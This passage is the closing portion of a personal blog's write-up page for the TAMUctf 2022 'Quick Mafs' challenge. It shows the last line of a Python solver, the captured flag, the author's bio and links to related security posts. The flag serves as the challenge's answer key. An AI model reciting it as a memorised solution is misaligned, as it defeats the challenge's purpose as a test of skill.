    <span class="token keyword">return</span> chain</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h3 id="flag" tabindex="-1"><a class="md-anchor" href="#flag" aria-hidden="true"></a> Flag</h3><div class="code-toolbar"><pre class="language-text" tabindex="0"><code class="language-text">gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Plain Text</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="TAMUctf 2022 – Quick Mafs" data-url="https://trebledj.me/posts/tamuctf-2022-quick-mafs/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/arbitrary-code-execution-for-breakfast/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/arbitrary-code-execution-for-breakfast/"><img class="post-img-blurred-bg" src="/img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 512" alt="Thumbnail for Sharing is Caring: Arbitrary Code Execution for Breakfast" srcset="/img/posts/infosec/cpp-deserialization/assets/popashell-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp 512w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 512" alt="Thumbnail for Sharing is Caring: Arbitrary Code Execution for Breakfast" srcset="/img/posts/infosec/cpp-deserialization/assets/popashell-256w.webp 256w, /img/posts/infosec/cpp-deserialization/assets/popashell-512w.webp 512w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Sharing is Caring: Arbitrary Code Execution for Breakfast</h2><div class="post-summary"><p>A CTF challenge exploring binary exploitation in C++, gadget mania, and a new form of deserialization attack.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/pwn/" itemprop="keywords">pwn</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/abusing-server-side-rendering-in-drogon/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/abusing-server-side-rendering-in-drogon/"><img class="post-img-blurred-bg" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Dynamic Views Loading – Abusing Server Side Rendering in Drogon</h2><div class="post-summary"><p>What could go wrong releasing a C++ web server with "live reload" into the wild?</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/attack-of-the-zip/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/attack-of-the-zip/"><img class="post-img-blurred-bg" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">From Compression to Compromise: Unmasking Zip File Threats</h2><div class="post-summary"><p>Deep dive into zip file attacks and mitigations (with examples!).</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/hkcert-2023-decompetition-vitamin-cpp/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/hkcert-2023-decompetition-vitamin-cpp/"><img class="post-img-blurred-bg" src="/img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++" srcset="/img/posts/ctf/hkcert23/assets/vitamin-cpp-256w.webp 256w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp 512w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-640w.webp 640w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++" srcset="/img/posts/ctf/hkcert23/assets/vitamin-cpp-256w.webp 256w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp 512w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-640w.webp 640w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++</h2><div class="post-summary"><p>A beginner-friendly writeup to reverse-engineering C++ a lá decompetition. Years of complex shenanigans condensed!</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/subtype-metaprogramming-is-mostly-harmless/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/subtype-metaprogramming-is-mostly-harmless/"><img class="post-img-blurred-bg" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title"><sub><sup>N[</sup></sub>Subtype Metaprogramming<sub><sup>]</sup></sub> is <sub><sup>N[</sup></sub>Mostly Harmless<sub><sup>]</sup></sub></h2><div class="post-summary"><p>Inheritance go brrrrrrrr... abusing turing-complete typesystems to write fun programs in Python.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/types/" itemprop="keywords">types</a> </span><span><a class="jtag" href="/tags/python/" itemprop="keywords">python</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/hitcon-2023-the-blade/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/hitcon-2023-the-blade/"><img class="post-img-blurred-bg" src="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 206" alt="Thumbnail for HITCON 2023 – The Blade" srcset="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-256w.webp 256w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp 512w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1024w.webp 1024w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1570w.webp 1570w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 206" alt="Thumbnail for HITCON 2023 – The Blade" srcset="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-256w.webp 256w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp 512w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1024w.webp 1024w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1570w.webp 1570w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">HITCON 2023 – The Blade</h2><div class="post-summary"><p>Beginner-friendly writeup for a nifty Rust reversing challenge.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a> </span><span><a class="jtag" href="/tags/rust/" itemprop="keywords">rust</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to ctf, pwn, reverse">software.security</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/ctf/">ctf</a> <a class="jtag" href="/tags/infosec/">infosec</a> <a class="jtag" href="/tags/reverse/">reverse</a> <a class="jtag" href="/tags/pentesting/">pentesting</a> <a class="jtag" href="/tags/pwn/">pwn</a> <a class="jtag" href="/tags/cryptography/">cryptography</a> <a class="jtag" href="/tags/cve/">cve</a> <a class="jtag" href="/tags/redteam/">redteam</a> <a class="jtag" href="/tags/stego/">stego</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to programming">software.general</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/programming/">programming</a> <a class="jtag" href="/tags/software-engineering/">software-engineering</a> <a class="jtag" href="/tags/web/">web</a> <a class="jtag" href="/tags/aoc/">aoc</a> <a class="jtag" href="/tags/apps/">apps</a> <a class="jtag" href="/tags/dsp/">dsp</a> <a class="jtag" href="/tags/programming-languages/">programming-languages</a> <a class="jtag" href="/tags/linux/">linux</a> <a class="jtag" href="/tags/performance/">performance</a> <a class="jtag" href="/tags/functional/">functional</a> <a class="jtag" href="/tags/types/">types</a> <a class="jtag" href="/tags/windows/">windows</a> <a class="jtag" href="/tags/ai/">ai</a> <a class="jtag" href="/tags/metaprogramming/">metaprogramming</a> <a class="jtag" href="/tags/oop/">oop</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to python">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/java/">java</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to writeup">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p>Comments are back! Privacy-focused; without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion— before AI invades social media, world leaders declare war on guppies, and what little humanity left is lost to time.</p><script defer src="/js/comentario.min.js"></script><script>if(window.location.hash.startsWith("#comentario")){const a=document.getElementById("comments");a&&a.scrollIntoView({behavior:"smooth"})}</script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://infosec.exchange/@trebledj" target="_blank"><i class="social-icon fab fa-mastodon" style="color:rgb(99, 101, 255) !important;"></i> </a><a rel="me noreferrer" href="https://x.com/trebledjjj" target="_blank"><i class="social-icon fab fa-twitter" style="color:rgb(99, 101, 255) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2026&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={}</script><script defer src="/cb/YmP0cUsv-I.js"></script><link href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css" rel="stylesheet" media="print"><script>document.querySelectorAll('link[media|="print"]').forEach(e=>{e.addEventListener("load",()=>e.media="all"),e.sheet&&(e.media="all")})</script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/katex.min.js" integrity="sha384-cMkvdD8LoxVzGF/RPUKAcvmm49FQ0oxwDF3BGKtDXcEc+T1b2N+teh/OJfpU0jr6" crossorigin="anonymous"></script><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.22/dist/contrib/auto-render.min.js" integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!0})})</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>